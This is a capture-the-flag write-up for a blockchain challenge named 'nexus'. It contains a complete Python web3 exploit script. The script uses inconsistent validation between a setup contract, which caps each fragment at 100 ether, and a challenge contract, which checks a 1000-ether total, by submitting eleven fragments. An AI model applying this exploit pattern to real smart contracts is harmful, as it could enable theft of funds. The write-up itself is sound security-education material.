# nexus - Blockchain

## Methodology
* **Vulnerability:** Smurfing Attack due to Inconsistent Validation Logic
* **Steps:**
    1.  Access the GZCLI Instance on port 50000.
    2.  Access the TCP Port Mapping page.
    3.  Solve the crypto challenge to access `RPC_URL, PRIVKEY, SETUP_ADDR, WALLET_ADDR`.
    4.  Run `solve.py` (explained below) against the instance.
    5.  Claim Flag.

## Reproducibility (Code/Commands)
```python
import time
from web3 import Web3
from eth_abi import encode

# --- CONFIGURATION ---
RPC_URL = ""
PRIVKEY = ""
SETUP_CONTRACT_ADDR = ""
WALLET_ADDR = ""

def solve():
    # 1. Connect to RPC
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("[-] Connection failed")
        return
    print(f"[+] Connected to {RPC_URL}")

    # 2. Define ABIs
    # Setup contract to get the challenge address and bind the pact
    setup_abi = [
        {"inputs": [], "name": "challenge", "outputs": [{"internalType": "contract Challenge", "name": "", "type": "address"}], "stateMutability": "view", "type": "function"},
        {"inputs": [{"internalType": "bytes", "name": "agreement", "type": "bytes"}], "name": "bindPact", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}
    ]
    
    # Challenge contract to register and transcend
    challenge_abi = [
        {"inputs": [], "name": "registerSeeker", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
        {"inputs": [{"internalType": "bytes", "name": "truth", "type": "bytes"}], "name": "transcend", "outputs": [], "stateMutability": "nonpayable", "type": "function"}
    ]

    # 3. Load Contracts
    setup = w3.eth.contract(address=SETUP_CONTRACT_ADDR, abi=setup_abi)
    
    # Get the Challenge contract address from Setup
    challenge_addr = setup.functions.challenge().call()
    print(f"[+] Challenge Contract at: {challenge_addr}")
    
    challenge = w3.eth.contract(address=challenge_addr, abi=challenge_abi)

    # 4. Helper function to send transactions
    def send_tx(func, description):
        print(f"[*] {description}...")
        tx = func.build_transaction({
            'from': WALLET_ADDR,
            'nonce': w3.eth.get_transaction_count(WALLET_ADDR),
            'gas': 2000000,
            'gasPrice': w3.eth.gas_price
        })
        signed = w3.eth.account.sign_transaction(tx, PRIVKEY)
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"    -> Success! Tx: {tx_hash.hex()}")

    # Exploit

    # Step 1: Register as a Seeker
    # Required by Challenge.sol: require(seekers[msg.sender], "Not a seeker");
    send_tx(challenge.functions.registerSeeker(), "Registering Seeker")

    # Step 2: Construct the Payload
    # We need 1000 ether total, but Setup limits each fragment to 100 ether.
    # Solution: 11 fragments of 100 ether = 1100 ether (passes both checks).
    
    # Struct definition: (address vessel, uint256 essence, bytes resonance)
    fragment_essence = 100 * 10**18  # 100 Ether
    fragments = []
    
    for _ in range(11):
        # (vessel, essence, resonance)
        fragments.append((WALLET_ADDR, fragment_essence, b''))

    # The outer tuple structure expected by abi.decode in the contracts:
    # (SoulFragment[], bytes32, uint32, address, address)
    # ABI String: ((address,uint256,bytes)[],bytes32,uint32,address,address)
    
    payload_data = (
        fragments,              # SoulFragment[]
        b'\x00' * 32,           # bytes32 (ignored)
        0,                      # uint32 (ignored)
        WALLET_ADDR,            # address binder/invoker (Must be us)
        WALLET_ADDR             # address witness (Must be us)
    )
    
    # Encode the data into bytes
    encoded_payload = encode(
        ['(address,uint256,bytes)[]', 'bytes32', 'uint32', 'address', 'address'],
        payload_data
    )

    # Step 3: Chronicle the Pact in Setup.sol
    # This stores the hash of our payload in the 'chronicles' mapping.
    # It passes because each individual fragment is <= 100 ether.
    send_tx(setup.functions.bindPact(encoded_payload), "Binding Pact (Chronicling)")

    # Step 4: Transcend in Challenge.sol
    # This reads the payload, verifies it is chronicled, and sums the essence.
    # It passes because Total Essence (1100) >= TRANSCENDENCE_ESSENCE (1000).
    send_tx(challenge.functions.transcend(encoded_payload), "Transcending")

    # Step 5: Check Solution
    if setup.functions.isSolved().call():
        print("\nFlag captured.")
    else:
        print("\nSomething went wrong")

if __name__ == "__main__":
    solve()
```

## 🤖 AI Usage

* Gemini 3 Pro was used alongside manual review to analyse the solana contracts and find the issue.
* `solve.py` written manually to start, then AI was used to speed up development.

## 🚩 Proof

Flag: C2C{...}
